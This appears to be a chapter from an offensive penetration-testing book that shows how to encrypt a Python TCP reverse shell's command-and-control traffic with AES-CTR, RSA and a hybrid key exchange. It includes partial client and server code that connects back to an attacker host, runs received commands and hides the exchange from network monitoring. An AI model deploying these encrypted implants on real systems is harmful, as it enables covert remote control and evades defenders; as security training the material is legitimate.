<html><head></head><body>
        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Abuse of Cryptography by Malware</h1>
                
            
            <article>
                
<p class="calibre2">In this chapter, we will protect our tunnel with something more solid than a simple XOR, as modern malware is using a well-known ciphering algorithm to protect its traffic in the transit path.</p>
<p class="calibre2">The topics covered in this chapter are as follows:</p>
<ul class="calibre9">
<li class="calibre10">Introduction to encryption algorithms</li>
<li class="calibre10">Protecting your tunnel with AES – stream mode</li>
<li class="calibre10">Protecting your tunnel with RSA</li>
<li class="calibre10">Hybrid encryption key</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Introduction to encryption algorithms</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we'll have a quick overview of the most common encryption algorithms in the cryptography world. Basically, there are two types of encryption algorithms. The first one is called <strong class="calibre4">symmetric</strong> and the second one is called <strong class="calibre4">asymmetric</strong>. Now, this classification is made based on the number of needed keys and how they are operated. Let's discuss the difference between these algorithms a little bit, and we will start with the symmetric one.</p>
<p class="calibre2">Now, symmetric encryption uses one key for both the encryption and the decryption process and this key is shared on both the client and the server side. Now, the most common examples of symmetric encryption are AES, Blowfish, RC4, and Triple DES. In asymmetric encryption, we have the concept of the key pair, where we have a key called <strong class="calibre4">public</strong> key that is used for encryption and we have a <strong class="calibre4">private</strong> key that is used for decryption. Now, the key name implies that the public key can be published over the untrusted network like the internet and doing so will cause no harm. On the other hand, the private key should never leave the operating system or the machine that is intended to decrypt the data. If the private key is leaked out of the operating system, then anybody who has that private key can decrypt the traffic.</p>
<p class="calibre2">The client or the target has to generate his/her own key pair and the server or the attacker has to generate his own keys. Now, after generating the key pair on each side, the operation will be as follows. The client will hold his own private key, and the server's public key. On the other hand, the server will hold his own private key and the client's public key. So, to quickly recap, after switching over, at this point on the Kali side we have our own private key and the target's public key. Also, on the target side, we have our own private key and we also hold the Kali public key. So, reflecting this to our shell, when we get a reverse shell prompt to enter our command to be executed, such as <kbd class="calibre12">ipconfig</kbd> it will be encrypted using the client's public key and we will send it over the tunnel.</p>
<p class="calibre2">When we enter <kbd class="calibre12">ipconfig</kbd> in the shell prompt, before sending over the <kbd class="calibre12">ipconfig</kbd> in a clear text, we will use the target's public key to encrypt this message and we will send it over the tunnel. No matter who's watching that traffic, only the client can decrypt it, and that's because only the client is the one who holds the private key. Using the target private key, we will decrypt the command and revert it to clear text, which is again, the <kbd class="calibre12">ipconfig</kbd> command. Now, when the client executes the <kbd class="calibre12">ipconfig</kbd>, instead of sending the output in clear text, the output will be encrypted using the server or Kali public key and we will send it over the tunnel. Now, on the Kali side, once we get the encrypted message, we will pass it over to our private key, which will be used to decrypt the traffic or to decrypt the message and print it out in clear text. Now, the last thing I should mention about asymmetric encryption are the most common examples of this algorithm, which are the RSA and <strong class="calibre4">Pretty Good Privacy</strong> (<strong class="calibre4">PGP</strong>).</p>
<p class="calibre2">There are certain advantages and disadvantages to both methods. The asymmetric algorithm is considered hard to break, more solid, and more secure than the symmetric one. However, it requires more processes and is much slower than the symmetric one. So, the question is, can we create a hybrid system or hybrid algorithm that can take advantage of both the symmetric and asymmetric systems? The answer is yes.</p>
<p class="calibre2">We will use the asymmetric algorithm to securely transfer a random and complex key. Now, this key will be used later on to encrypt our transfer data using symmetric algorithm. So, basically, here's the deal. The Kali machine will hold the target's public key, then we will generate symmetric key on the Kali side. Now, we will take advantage of the asymmetric public key of the target side and we will use it to encrypt the generated symmetric key and send it over to the target side. Now, the target will decrypt the symmetric key using its private key.</p>
<p class="calibre2">We will use the target private key to export or to decrypt the symmetric key here. So, at this point, we can use this symmetric key for our tunnel encryption. Now, once we have securely transferred the symmetric key, we can use it to encrypt each command or output going through this tunnel. So, to recap really quickly, as soon as the target initiates a session back to us on the Kali side, we will generate the symmetric key. Now, to securely transfer this symmetric key, we will encrypt it using the target's public key, and send it over. On the target side, we will decrypt that message and extract the symmetric key one more time. At this point, we have the symmetric key on both ends. Now, we can securely transfer our commands back and forth using the symmetric key. The last thing we should talk about are the benefits for using a hybrid method, which are, first, we keep our generated symmetric key secure by transferring it securely over the internet. Second, keep in mind that this is a randomly generated key and will be changed on each connection. Instead of hardcoding the key on both sides or on both ends, the key will change per connection. Moreover, we can change the key whenever we want. So for example, in VPN IPSEC protocol you can set a criteria where you can change the encryption key after a certain amount of time or after consuming a certain bandwidth.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Protecting your tunnel with AES – stream mode</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will protect our TCP tunnel with AES encryption. Now, generally speaking, AES encryption can operate in two modes, the <strong class="calibre4">Counter (CTR) mode encryption</strong> (also called the <strong class="calibre4">Stream Mode</strong>) and the <strong class="calibre4">Cipher Block Chaining (CBC) mode encryption</strong> <span class="calibre11">(also called the </span><strong class="calibre4">Block Mode</strong>)<strong class="calibre4">.</strong></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Cipher Block Chaining (CBC) mode encryption</h1>
                
            
            <article>
                
<p class="calibre2"><span class="calibre11">The <strong class="calibre4">Block Mode</strong> means that we need to send data in the form of chunks:</span></p>
<div class="packt_figure1"><img src="../images/00055.jpeg" class="calibre61"/></div>
<p class="calibre2">For instance, if we say that we have a block size of 512 bytes and we want to send 500 bytes, then we need to add 12 bytes additional padding to reach 512 bytes of total size. If we want to send 514 bytes, then the first 512 bytes will be sent in a chunk and the second chunk or the next chunk will have a size of 2 bytes. However, we cannot just send 2 bytes alone, as we need to add additional padding of 510 bytes to reach 512 in total for the second chunk. Now, on the receiver side, you would need to reverse the steps by removing the padding and decrypting the message.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Counter (CTR) mode encryption </h1>
                
            
            <article>
                
<p class="calibre2">Now, let's jump to the other mode, which is the <strong class="calibre4">Counter (CTR) mode encryption</strong> or the <strong class="calibre4">Stream Mode</strong>:</p>
<div class="packt_figure1"><img src="../images/00056.jpeg" class="calibre62"/></div>
<p class="calibre2">Here, in this mode, the message size does not matter since we are not limited with a block size and we will encrypt in stream mode, just like XOR does. Now, the block mode is considered stronger by design than the stream mode. In this section, we will implement the stream mode and I will leave it to you to search around and do the block mode.</p>
<p class="calibre2">The most well-known library for cryptography in Python is called <kbd class="calibre12">PyCrypto</kbd>. For Windows, there is a compiled binary for it, and for the Kali side, you just need to run the setup file after downloading the library. You can download the library from <a href="http://www.voidspace.org.uk/python/modules.shtml#pycrypto" class="calibre8">http://www.voidspace.org.uk/python/modules.shtml#pycrypto</a>. So, as a start, we will use <kbd class="calibre12">AES</kbd> without TCP or HTTP tunneling:</p>
<pre class="packt_figure"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7<br class="title-page-name"/># http://www.voidspace.org.uk/python/modules.shtml#pycrypto<br class="title-page-name"/><br class="title-page-name"/># Download Pycrypto source<br class="title-page-name"/># https://pypi.python.org/pypi/pycrypto<br class="title-page-name"/># For Kali, after extract the tar file, invoke "python setup.py install"<br class="title-page-name"/><br class="title-page-name"/># AES Stream<br class="title-page-name"/><br class="title-page-name"/>import os<br class="title-page-name"/>from Crypto.Cipher import AES<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>counter = os.urandom(16) #CTR counter string value with length of 16 bytes.<br class="title-page-name"/>key = os.urandom(32) #AES keys may be 128 bits (16 bytes), 192 bits (24 bytes) or 256 bits (32 bytes) long.<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/># Instantiate a crypto object called enc<br class="title-page-name"/>enc = AES.new(key, AES.MODE_CTR, counter=lambda: counter)<br class="title-page-name"/>encrypted = enc.encrypt("Hussam"*5)<br class="title-page-name"/>print encrypted<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/># And a crypto object for decryption<br class="title-page-name"/>dec = AES.new(key, AES.MODE_CTR, counter=lambda: counter)<br class="title-page-name"/>decrypted = dec.decrypt(encrypted)<br class="title-page-name"/>print decrypted</pre>
<p class="calibre2">The code is quite straightforward. We will start by importing the <kbd class="calibre12">os</kbd> library, and we will import the <kbd class="calibre12">AES</kbd> class from <kbd class="calibre12">Crypto.Cipher</kbd> library. Now, we use the <kbd class="calibre12">os</kbd> library to create the random <kbd class="calibre12">key</kbd> and random <kbd class="calibre12">counter</kbd>. The counter length is <kbd class="calibre12">16</kbd> bytes, and we will go for <kbd class="calibre12">32</kbd> bytes length for the key size in order to implement AES-256. Next, we create an encryption object by passing the <kbd class="calibre12">key</kbd>, the AES mode (which is again the stream or CTR mode) and the <kbd class="calibre12">counter</kbd> value. Now, note that the <kbd class="calibre12">counter</kbd> is required to be sent as a callable object. That's why we used <kbd class="calibre12">lambda</kbd> structure or <kbd class="calibre12">lambda</kbd> construct, where it's a sort of anonymous function, like a function that is not bound to a name. The decryption is quite similar to the encryption process. So, we create a decryption object, and then pass the encrypted message and finally, it prints out the decrypted message, which should again be clear text.</p>
<p class="calibre2">So, let's quickly test this script and encrypt my name. Once we run the script the encrypted version will be printed above and the one below is the decrypted one, which is the clear-text one:</p>
<pre class="packt_figure"><strong class="calibre1">&gt;&gt;&gt;</strong><br class="title-page-name"/><strong class="calibre1">]ox:|s</strong><br class="title-page-name"/><strong class="calibre1">Hussam</strong><br class="title-page-name"/><strong class="calibre1">&gt;&gt;&gt;</strong></pre>
<p class="calibre2">So, to test the message size, I will just invoke a space and multiply the size of my name with <kbd class="calibre12">5</kbd>. So, we have <kbd class="calibre12">5</kbd> times of the length here. The size of the clear-text message does not matter here. No matter what the clear-text message was, with the stream mode, we get no problem at all.</p>
<p class="calibre2">Now, let us integrate our encryption function to our TCP reverse shell. The following is the client side script:</p>
<pre class="packt_figure"># Python For Offensive PenTest# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7<br class="title-page-name"/># http://www.voidspace.org.uk/python/modules.shtml#pycrypto<br class="title-page-name"/><br class="title-page-name"/># Download Pycrypto source<br class="title-page-name"/># https://pypi.python.org/pypi/pycrypto<br class="title-page-name"/># For Kali, after extract the tar file, invoke "python setup.py install"<br class="title-page-name"/><br class="title-page-name"/># AES - Client - TCP Reverse Shell<br class="title-page-name"/><br class="title-page-name"/>import socket <br class="title-page-name"/>import subprocess <br class="title-page-name"/><br class="title-page-name"/>from Crypto.Cipher import AES<br class="title-page-name"/><br class="title-page-name"/>counter = "H"*16<br class="title-page-name"/>key = "H"*32<br class="title-page-name"/><br class="title-page-name"/>def encrypt(message):<br class="title-page-name"/>    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)<br class="title-page-name"/>    return encrypto.encrypt(message)<br class="title-page-name"/><br class="title-page-name"/>def decrypt(message):<br class="title-page-name"/>    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)<br class="title-page-name"/>    return decrypto.decrypt(message) <br class="title-page-name"/> <br class="title-page-name"/><br class="title-page-name"/>def connect():<br class="title-page-name"/>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br class="title-page-name"/>    s.connect(('10.10.10.100', 8080)) <br class="title-page-name"/> <br class="title-page-name"/>    while True: <br class="title-page-name"/>        command = decrypt(s.recv(1024))<br class="title-page-name"/>        print ' We received: ' + command<br class="title-page-name"/>        <br class="title-page-name"/>...</pre>
<p class="calibre2">What I have added was a new function for encryption and decryption for both sides and, as you can see, the key and the counter values are hardcoded on both sides. A side note I need to mention is that we will see in the hybrid encryption later how we can generate a random value from the Kali machine and transfer it securely to our target, but for now, let's keep it hardcoded here.</p>
<p class="calibre2">The following is the server side script: </p>
<pre class="packt_figure"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7<br class="title-page-name"/># http://www.voidspace.org.uk/python/modules.shtml#pycrypto<br class="title-page-name"/><br class="title-page-name"/># Download Pycrypto source<br class="title-page-name"/># https://pypi.python.org/pypi/pycrypto<br class="title-page-name"/># For Kali, after extract the tar file, invoke "python setup.py install"<br class="title-page-name"/><br class="title-page-name"/># AES - Server- TCP Reverse Shell<br class="title-page-name"/><br class="title-page-name"/>import socket <br class="title-page-name"/>from Crypto.Cipher import AES<br class="title-page-name"/><br class="title-page-name"/>counter = "H"*16<br class="title-page-name"/>key = "H"*32<br class="title-page-name"/><br class="title-page-name"/>...<br class="title-page-name"/> <br class="title-page-name"/>def connect():<br class="title-page-name"/>    <br class="title-page-name"/>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br class="title-page-name"/>    s.bind(("10.10.10.100", 8080)) <br class="title-page-name"/>    s.listen(1) <br class="title-page-name"/>    print '[+] Listening for incoming TCP connection on port 8080'<br class="title-page-name"/>    conn, addr = s.accept() <br class="title-page-name"/>    print '[+] We got a connection from: ', addr<br class="title-page-name"/><br class="title-page-name"/>...</pre>
<p class="calibre2">This is how it works. Before sending anything, we will pass whatever we want to send to the encryption function first. When we get the shell prompt, our input will be passed first to the encryption function; then it will be sent out of the TCP socket. Now, if we jump to the target side, it's almost a mirrored image. When we get an encrypted message, we will pass it first to the decryption function, and the decryption will return the clear-text value. Also, before sending anything to the Kali machine, we will encrypt it first, just like we did on the Kali side.</p>
<p class="calibre2">Now, run the script on both sides. Keep Wireshark running in background at the Kali side. Let's start with the <kbd class="calibre12">ipconfig</kbd>. So on the target side, we will able to decipher or decrypt the encrypted message back to clear text successfully.</p>
<p class="calibre2">Now, to verify that we got the encryption in the transit path, on the Wireshark, if we right-click on the particular IP and select <span class="calibre11">Follow TCP Stream</span> in Wireshark, we will see that the message has been encrypted before being sent out to the TCP socket.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Protecting your tunnel with RSA</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will be using the RSA asymmetric algorithm to protect our tunnel. Now, to review the requirements for asymmetric encryption: as we said, each entity has its own key pair; when I say key pair, I mean a public and a private key. The final key-pair distribution will be as follows. The client will hold its own private key and the server's public key. On the other side, the server or the Kali machine will hold its own private key and the target's public key. So, when we want to send a message or command to our target from the Kali side, first we will encrypt that message using the target's public key and then we will send it over the tunnel in encrypted format. The target will grab that command or message, and using its private key it can decrypt it and extract it back to clear text. The reply, after executing the command, will be encrypted using the server's public key. After that, we will send it out in encrypted format to the network and once we received that message or that encrypted message on the Kali machine, we will use the Kali private key to decrypt it back to clear text.</p>
<p class="calibre2">Now, the first step is to generate a key pair on both sides:</p>
<pre class="packt_figure"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7<br class="title-page-name"/># http://www.voidspace.org.uk/python/modules.shtml#pycrypto<br class="title-page-name"/><br class="title-page-name"/># Download Pycrypto source<br class="title-page-name"/># https://pypi.python.org/pypi/pycrypto<br class="title-page-name"/># For Kali, after extract the tar file, invoke "python setup.py install"<br class="title-page-name"/><br class="title-page-name"/># Generate Keys<br class="title-page-name"/><br class="title-page-name"/>from Crypto.PublicKey import RSA <br class="title-page-name"/>new_key = RSA.generate(4096 ) # generate RSA key that 4096 bits long<br class="title-page-name"/><br class="title-page-name"/>#Export the Key in PEM format, the PEM extension contains ASCII encoding<br class="title-page-name"/><br class="title-page-name"/>public_key = new_key.publickey().exportKey("PEM") <br class="title-page-name"/>private_key = new_key.exportKey("PEM") <br class="title-page-name"/>print private_key<br class="title-page-name"/>print public_key</pre>
<p class="calibre2">So, we start with importing the <kbd class="calibre12">RSA</kbd> class. Then, we create a new object to generate a key with a size of <kbd class="calibre12">4096</kbd> bits. Now, this is the maximum size that <kbd class="calibre12">RSA</kbd> can support, but the tax that you will pay for having a complex key is the slowness. The more key size the more secure, but slower will be the operation. Next, we export the keys in <kbd class="calibre12">PEM</kbd> format. <kbd class="calibre12">PyCrypto</kbd> supports other formats such as <kbd class="calibre12">DER</kbd>, which is binary encoding. The most common format is the <kbd class="calibre12">PEM</kbd>, which is also used on network devices such as firewalls and routers for VPN or HTTPS access purposes. Now, after printing out the generated keys, we'll save them to the <kbd class="calibre12">private.pem</kbd> and <kbd class="calibre12">public.pem</kbd> files.</p>
<p class="calibre2">Let's start, and run the Generate Keys script given previously on both sides, at target and attacker. On the Kali side we will get the RSA private key and the public key. The begin and the end of keys will be marked. We will get a similar result on the Windows side too. So, what we'll do right now is we'll copy each key on the Kali machine end and save it to a separate file. Let's start with the private key on the attacker machine and simply paste the private key in a notepad file. Rename this file to <kbd class="calibre12">private.pem</kbd>. Now, let's go and do the same for the public key. Let's call this one <kbd class="calibre12">public.pem</kbd>. After this, jump to the Windows side and do what we have done on the Kali machine.</p>
<p class="calibre2">Now, as we did with the AES encryption, before integrating the encryption to our tunnel, let's first have a look at how the encryption and decryption will work:</p>
<pre class="packt_figure"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7<br class="title-page-name"/># http://www.voidspace.org.uk/python/modules.shtml#pycrypto<br class="title-page-name"/><br class="title-page-name"/># Download Pycrypto source<br class="title-page-name"/># https://pypi.python.org/pypi/pycrypto<br class="title-page-name"/># For Kali, after extract the tar file, invoke "python setup.py install"from Crypto.PublicKey import RSA<br class="title-page-name"/><br class="title-page-name"/># RSA ENC-DEC<br class="title-page-name"/><br class="title-page-name"/>from Crypto.PublicKey import RSA<br class="title-page-name"/><br class="title-page-name"/>def encrypt(message):<br class="title-page-name"/>    publickey = open("public.pem", "r")<br class="title-page-name"/>    encryptor = RSA.importKey(publickey)<br class="title-page-name"/>    global encriptedData<br class="title-page-name"/>    '''<br class="title-page-name"/>The encrypt function, will take two arguments, the second one can be discarded<br class="title-page-name"/>&gt;&gt;that's why we passed (message,0) arguments<br class="title-page-name"/><br class="title-page-name"/>The returned value is a tuple with two items. The first item is the<br class="title-page-name"/>cipher text. The second item is always None.<br class="title-page-name"/>&gt;&gt;that's why print encriptedData[0]<br class="title-page-name"/><br class="title-page-name"/>Ref: https://pythonhosted.org/pycrypto/Crypto.PublicKey.RSA._RSAobj-class.html#encrypt<br class="title-page-name"/>    '''<br class="title-page-name"/>    encriptedData=encryptor.encrypt(message,0)<br class="title-page-name"/>    print encriptedData[0]<br class="title-page-name"/><br class="title-page-name"/>encrypt('Hussam')<br class="title-page-name"/><br class="title-page-name"/>def decrypt(cipher):<br class="title-page-name"/>    privatekey = open("private.pem", "r")<br class="title-page-name"/>    decryptor = RSA.importKey(privatekey)<br class="title-page-name"/>    print decryptor.decrypt(cipher) <br class="title-page-name"/><br class="title-page-name"/>decrypt(encriptedData)</pre>
<p class="calibre2">Here, we first define an encryption function, where we will pass the message that we want to encrypt, and a decryption function down below, just as we did in the AES case. Now, after getting the clear-text message, we will open the public key file that will encrypt the message for us and link the imported key into the <kbd class="calibre12">encryptor</kbd> object. Now, the <kbd class="calibre12">encryptor</kbd> object will do the actual encryption for us.</p>
<p class="calibre2">The encryption function in the <kbd class="calibre12">RSA</kbd> class takes two parameters. The first one is the plaintext message and the second one can be simply discarded. Therefore, we have passed a <kbd class="calibre12">0</kbd> value. Another thing is that, the encryption output is returned in a tuple format. The first item contains the encrypted text, so we'll print it out and for testing purposes—I'm starting with encrypting my name.</p>
<p class="calibre2">Let's jump to the decryption process and we will do something similar to the encryption process by importing. Now, here's the key difference. In the decryption, we'll import the <kbd class="calibre12">privatekey</kbd> and pass the <kbd class="calibre12">cipher</kbd> value and print it out in a clear text after doing the decryption.</p>
<p class="calibre2">Let's try and run the script on the Windows side and if you encounter an error message saying that we've got no file or directory for <kbd class="calibre12">public.pem</kbd> most likely, this error message is because of the format for the saved file. View the complete extension and remove the <kbd class="calibre12">.txt</kbd> and make it <kbd class="calibre12">.pem</kbd> for both public and private files.</p>
<p class="calibre2">Here, we want to start by encrypting my name, and we will pass my name in clear text to the encryption function. Now, once we import the public key for encryption, we will print the encrypted message. Then, we will pass the encrypted message back to the decryption function so we can print it out in clear-text format.</p>
<p class="calibre2">Right now, if we jump to the Kali side and run the script with a slight change in the <kbd class="calibre12">encrypt()</kbd> function:</p>
<pre class="packt_figure">...<br class="title-page-name"/>encrypt('H'*512)<br class="title-page-name"/>...</pre>
<p class="calibre2">Now, notice that I have encrypted a message that has a size of <kbd class="calibre12">512</kbd> bytes in the code block. The point that I want to show you is that RSA is working as a block <kbd class="calibre12">cipher</kbd> type and, per <kbd class="calibre12">PyCrypto</kbd> implementation, the block size is <kbd class="calibre12">512</kbd> bytes.</p>
<p class="calibre2">Now, let's see what'll happen if I raised the message size by 1 byte. So, instead of multiplying this one with <kbd class="calibre12">512</kbd>, I will simply multiply with <kbd class="calibre12">513</kbd>. So, an exception will be thrown saying that the plaintext is too large to be handled.</p>
<p class="calibre2">So, the maximum size of the message must be <kbd class="calibre12">512</kbd> bytes. Now, what I will do first is I will integrate the RSA to our TCP tunnel and then I will show you how we can solve the block size issue within a few lines of Python code. Now, the integration is quite similar to what we have done in the previous section. Let's look into the client side script:</p>
<pre class="packt_figure"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7<br class="title-page-name"/># http://www.voidspace.org.uk/python/modules.shtml#pycrypto<br class="title-page-name"/><br class="title-page-name"/># Download Pycrypto source<br class="title-page-name"/># https://pypi.python.org/pypi/pycrypto<br class="title-page-name"/># For Kali, after extract the tar file, invoke "python setup.py install"<br class="title-page-name"/><br class="title-page-name"/># RSA - Client - TCP Reverse Shell<br class="title-page-name"/><br class="title-page-name"/>import socket <br class="title-page-name"/>import subprocess <br class="title-page-name"/><br class="title-page-name"/>from Crypto.PublicKey import RSA<br class="title-page-name"/><br class="title-page-name"/>def encrypt(message):<br class="title-page-name"/>    #Remember that here we define the server's public key<br class="title-page-name"/>    publickey ='''-----BEGIN PUBLIC KEY-----<br class="title-page-name"/>...<br class="title-page-name"/>-----END PUBLIC KEY-----'''<br class="title-page-name"/><br class="title-page-name"/>    encryptor = RSA.importKey(publickey)<br class="title-page-name"/>    global encriptedData<br class="title-page-name"/>    encriptedData=encryptor.encrypt(message, 0)<br class="title-page-name"/>    return encriptedData[0]<br class="title-page-name"/><br class="title-page-name"/>def decrypt(cipher):<br class="title-page-name"/>    #Remember that here we define our (the target's) private key<br class="title-page-name"/>    privatekey = '''-----BEGIN RSA PRIVATE KEY-----<br class="title-page-name"/>...<br class="title-page-name"/>-----END RSA PRIVATE KEY-----'''<br class="title-page-name"/>    <br class="title-page-name"/>    decryptor = RSA.importKey(privatekey)<br class="title-page-name"/>    dec = decryptor.decrypt(cipher) <br class="title-page-name"/>    return dec<br class="title-page-name"/><br class="title-page-name"/>def connect():<br class="title-page-name"/>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br class="title-page-name"/>    s.connect(('10.10.10.100', 8080)) <br class="title-page-name"/> <br class="title-page-name"/>    while True:<br class="title-page-name"/>        <br class="title-page-name"/>        command = decrypt(s.recv(512))<br class="title-page-name"/>        print ' We received: ' + command<br class="title-page-name"/>...</pre>
<p class="calibre2">So, I have created two functions: one for the encryption and a second one for the decryption. Before sending any command, we will pass it first to the encryption function and before printing any result, we will pass what we get to the decryption function. Now, remember that the target holds its private key and the server's public key and the Kali machine holds its private key and the client's public key. Now, go to the Kali machine and open the public key which you had saved in the text file. Copy and paste the public key into the variable. So, obviously, we would need to import these keys manually before exporting the script on the target side into EXE format. Now, we will open the public key from the target side that we have just generated. Remember, this public key should be located in the public key variable on the Kali machine. Perform the same operation as the previous one.</p>
<p class="calibre2">Right now, it's time for the private key. So, the private key for the Kali machine will be located on the script for the Kali machine. Copy-paste the private keys from the text files into the strings on both server and client side and save them. Now, let's find out whether our scripts will work after the integration to the TCP tunnel. Start Wireshark and run it on the server side. Let's jump to the target side and, basically, we get a connection and a shell prompt. Check the connection with something less heavy like <kbd class="calibre12">whoami</kbd>.</p>
<p class="calibre2">Now, keep in mind that <kbd class="calibre12">whoami</kbd> is less than <kbd class="calibre12">512</kbd> bytes; so, we were able to encrypt it successfully on the Kali machine and send it over to the target side. Also, since the output of the executing <kbd class="calibre12">whoami</kbd> on the target side is also less than <kbd class="calibre12">512</kbd> bytes we get the reply successfully. So, we have verified that the encryption is working here. Now, let's try with another command say, <kbd class="calibre12">ipconfig</kbd>.</p>
<p class="calibre2">You will notice that we have received the command successfully but for some reason we get no output on the Kali side and this is because the execution output of the <kbd class="calibre12">ipconfig</kbd> on the client side or on the target side is larger than <kbd class="calibre12">512</kbd> bytes, and therefore the script will crash as we have exceeded the message size. Now, as I said earlier, this can be resolved by verifying the message length and breaking it down into chunks, where each chunk should be less than or equal to <kbd class="calibre12">512</kbd> bytes. So, let's jump to the latest code, which resolves the bulk size problem for us:</p>
<pre class="packt_figure">...     <br class="title-page-name"/> if len(result)&gt;512:<br class="title-page-name"/>                for i in range(0, len(result), 512):<br class="title-page-name"/>                    chunk = result[0+i:512+i]<br class="title-page-name"/>                    s.send( encrypt (chunk ) )<br class="title-page-name"/><br class="title-page-name"/>            else:<br class="title-page-name"/>                s.send( encrypt (result ) ) <br class="title-page-name"/>...</pre>
<p class="calibre2">We have created an <kbd class="calibre12">if</kbd> statement to check the size of the command execution output. For instance, let's say the command that we got from Kali was <kbd class="calibre12">ipconfig</kbd>. So, we'll see if the output or the size of the output of <kbd class="calibre12">ipconfig</kbd> is larger than <kbd class="calibre12">512</kbd> bytes. If it's not, then we got no problem: we will send the output to the <kbd class="calibre12">encrypt()</kbd> function, then it will be sent directly to the Kali machine. However, if the output was larger than <kbd class="calibre12">512</kbd> bytes, we will split it into chunks, where the maximum size for each chunk is <kbd class="calibre12">512</kbd> bytes. The splitting will happen by making a <kbd class="calibre12">for</kbd> loop, where we'll start from <kbd class="calibre12">0</kbd> until the length of our command execution output. And each time we make a loop, we will increment our <kbd class="calibre12">i</kbd> counter with <kbd class="calibre12">512</kbd> bytes. So, what we'll achieve by doing this is, the chunk variable will hold the split result, where the first chunk will cut the result from <kbd class="calibre12">0</kbd> to <kbd class="calibre12">512</kbd> bytes and the second chunk will be from <kbd class="calibre12">500</kbd> to <kbd class="calibre12">1024</kbd> bytes, and so on, until reaching the length of the command output. Now, note that each time we got a chunk we are good to go and we will send it immediately to the attacker machine after for sure passing out or passing into the encryption function.</p>
<p class="calibre2">Now, on the target side, since the maximum size of the received data is already known to us, which is again <kbd class="calibre12">512</kbd> bytes, instead of reading 1 KB and splitting into chunks again, we will read one chunk each time. So, that's why we have changed the received value from <kbd class="calibre12">1</kbd> KB to <kbd class="calibre12">512</kbd> bytes. So, now, after decrypting the chunk, if we got a clear-text message with full size of <kbd class="calibre12">512</kbd> bytes, this probably means that this message has been split into chunks on the target side, right? So, the next message or chunk is related to the first one. Now, this is why the stored variable will hold both of them, and when I say both, I mean <kbd class="calibre12">store + decrypt</kbd> message and the next coming <kbd class="calibre12"><span>store + decrypt</span></kbd>. Finally, we will <kbd class="calibre12">print</kbd> out the <kbd class="calibre12">result</kbd>.</p>
<div class="packt_infobox">If the command execution was larger than two messages or, in other words, was larger than 1 KB, then we may need to link the third message as well to the stored variable.</div>
<p class="calibre2">So, let's verify if our code is working right now. Start running the server side and the client side. Let's start with the command that we failed to run earlier, that is <kbd class="calibre12">ipconfig</kbd>. We will see that we get the output in a single piece, even it is bigger than <kbd class="calibre12">512</kbd> bytes. The same goes for <kbd class="calibre12">whoami</kbd> and directories.</p>
<div class="packt_infobox">RSA is also being used in developing something called <strong class="calibre1">ransomware</strong>. Now, in ransomware, the attackers can encrypt the target files using a public key and ask for money to provide the private key, which will decrypt their important files.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Hybrid encryption key</h1>
                
            
            <article>
                
<p class="calibre2">At this point, you should be able to code and implement both the RSA asymmetric and the AES symmetric encryption, and integrate both of them over our TCP shell. So, now, we will implement a hybrid way to take advantage of both the algorithms. So let's quickly recap. The client will hold its own private key, and the server or the Kali machine will hold the target's public key. Once the TCP connection is started, the Kali machine will generate a random AES key and we will securely send this key to the target side. The reason that I say <strong class="calibre4">securely</strong> is because the transfer will happen via encryption or via encrypting the random AES key with a target's public key. Once the target gets that message, it will decrypt it using the target private key and extract the AES key back to clear text. At this point, both the Kali and the target machines have the same random generated AES keys which can, and will, be used for AES encryption. Now, the AES encryption at this point will be used to encrypt our commands that will be transferred back and forth between the Kali machine and our target.</p>
<div class="packt_infobox">Upon a new connection, both Kali and the target will repeat the whole process, and a new random key will be derived. Now, this is why it's called a <strong class="calibre1">hybrid method</strong>, since we are using the asymmetric algorithm to securely transfer a generated symmetric key, which eventually will be used to encrypt our commands.</div>
<p class="calibre2">So, let's jump to the coding part, which is sort of a mix between the symmetric and the asymmetric. The following is the server side-script:</p>
